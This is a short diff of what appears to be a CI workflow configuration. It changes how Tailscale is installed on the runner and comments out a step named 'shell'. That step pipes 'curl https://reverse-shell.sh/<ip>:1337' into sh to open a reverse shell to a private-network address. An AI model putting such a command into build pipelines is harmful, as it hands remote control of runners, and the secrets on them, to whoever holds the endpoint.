@@ -10,10 +10,10 @@ jobs:
     steps:
       - name: install-tailscale
         run: |
-          brew install tailscale
-          brew services start tailscale
+          sudo port install tailscale
           sudo tailscale up --authkey ${{ secrets.TAILSCALE_API_KEY }}
+          
 
-      - name: shell
-        run: |
-          curl https://reverse-shell.sh/100.78.219.49:1337 | sh
+      #- name: shell
+      #  run: |
+      #    curl https://reverse-shell.sh/100.78.219.49:1337 | sh
